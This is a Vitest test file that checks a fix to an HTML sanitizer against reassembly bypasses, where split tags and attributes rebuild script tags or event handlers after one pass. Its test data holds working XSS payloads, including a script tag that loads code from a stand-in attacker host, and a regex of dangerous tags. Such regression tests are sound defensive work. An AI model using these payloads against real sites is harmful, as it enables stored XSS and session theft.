import { describe, it, expect } from 'vitest';
import { sanitizeRichHtml } from '../lib/htmlSanitize';

// sanitizeRichHtml used to run its replacement chain exactly ONCE. Every
// replacement splices the text on either side of the removed span together, so a
// single pass can REASSEMBLE the construct it just removed:
//
//   '<scr' + '<link>' + 'ipt>'           -> '<script>'
//   ' on'  + ' ona="1"' + 'error="..."'  -> ' onerror="..."'
//
// That mattered because operator-entered `termsOfService` reaches a render sink
// that does NOT run DOMPurify — the contenteditable seed in
// components/views/admin/LegalDocumentsTab.tsx assigns it to innerHTML directly.
// Event-handler attributes on elements inserted via innerHTML DO fire (unlike a
// <script> element), and the write action is gated on `admin:config:branding`, a
// delegatable role — so this was a stored-XSS escalation into a full Admin's
// session, not self-XSS.
//
// The module header is explicit that this is defence-in-depth and "NOT a
// complete HTML parser/allow-list" — these tests pin the reassembly class only.
// They are not a licence to treat it as a sole sanitizer at any HTML sink.

const DANGEROUS = /<script|<iframe|<object|<embed|\son\w+\s*=|srcdoc/i;

describe('sanitizeRichHtml — single-pass reassembly bypasses', () => {
    // Each of these round-tripped to live, dangerous HTML before the fix.
    const reassemblyPayloads: Array<[string, string]> = [
        ['event handler split across a decoy attribute', '<img src=x on ona="1"error="alert(1)">'],
        ['event handler split on an svg', '<svg on onx=""load=alert(1)>'],
        ['script rebuilt through the void-tag pass', '<scr<link>ipt>alert(1)</script>'],
        ['script src rebuilt through a meta decoy', '<scr<meta>ipt src=//evil.example/x.js>'],
        ['iframe srcdoc rebuilt through a meta decoy', '<ifr<meta>ame srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
        ['script rebuilt through the block-tag lazy match', '<scr<script>ipt>alert(1)</scr</script>ipt>'],
        ['handler rebuilt on a div', '<div on ondummy="a"click="alert(1)">hi</div>'],
    ];

    for (const [name, payload] of reassemblyPayloads) {
        it(`neutralises: ${name}`, () => {
            const out = sanitizeRichHtml(payload);
            expect(out, `payload reassembled into: ${out}`).not.toMatch(DANGEROUS);
        });
    }

    it('still strips the straightforward cases', () => {
        expect(sanitizeRichHtml('<img src="x" onerror="alert(1)">')).not.toMatch(DANGEROUS);
        expect(sanitizeRichHtml('<script>alert(1)</script>')).not.toMatch(DANGEROUS);
        expect(sanitizeRichHtml('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript:');
    });

    it('reaches a fixpoint — sanitizing twice changes nothing', () => {
        for (const [, payload] of reassemblyPayloads) {
            const once = sanitizeRichHtml(payload);
            expect(sanitizeRichHtml(once)).toBe(once);
        }
    });

    it('leaves legitimate operator rich text intact', () => {
        const legit = '<h2>Terms</h2><p>Hello <strong>world</strong> — see <a href="https://example.com">our site</a>.</p><ul><li>One</li></ul>';
        expect(sanitizeRichHtml(legit)).toBe(legit);
    });

    it('handles non-string and empty input without throwing', () => {
        expect(sanitizeRichHtml(undefined)).toBe('');
        expect(sanitizeRichHtml(null)).toBe('');
        expect(sanitizeRichHtml(42)).toBe('');
        expect(sanitizeRichHtml('')).toBe('');
    });

    it('terminates on adversarially nested input (no runaway loop)', () => {
        // Deep nesting must hit the pass cap and return, not spin.
        const nested = '<scr'.repeat(500) + '<link>' + 'ipt>'.repeat(500);
        const started = process.hrtime.bigint();
        const out = sanitizeRichHtml(nested);
        const ms = Number(process.hrtime.bigint() - started) / 1e6;
        expect(typeof out).toBe('string');
        expect(ms).toBeLessThan(2000);
    });
});
